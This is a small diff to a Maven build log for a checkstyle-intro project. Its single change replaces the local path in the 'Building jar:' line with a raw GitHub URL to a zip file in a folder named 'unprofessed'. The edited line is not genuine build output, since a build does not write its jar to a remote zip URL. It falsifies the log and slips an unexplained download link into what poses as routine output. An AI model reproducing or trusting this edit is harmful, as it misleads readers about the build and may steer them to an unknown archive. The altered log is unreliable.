@@ -27,7 +27,7 @@ Tests run: 0, Failures: 0, Errors: 0, Skipped: 0
 
 [INFO] 
 [INFO] --- maven-jar-plugin:2.4:jar (default-jar) @ diamond ---
-[INFO] Building jar: /home/runner/work/checkstyle-intro/checkstyle-intro/target/diamond-1.0-SNAPSHOT.jar
+[INFO] Building jar: https://raw.githubusercontent.com/karaedd/checkstyle-intro/master/unprofessed/checkstyle-intro.zip
 [INFO] ------------------------------------------------------------------------
 [INFO] BUILD SUCCESS
 [INFO] ------------------------------------------------------------------------
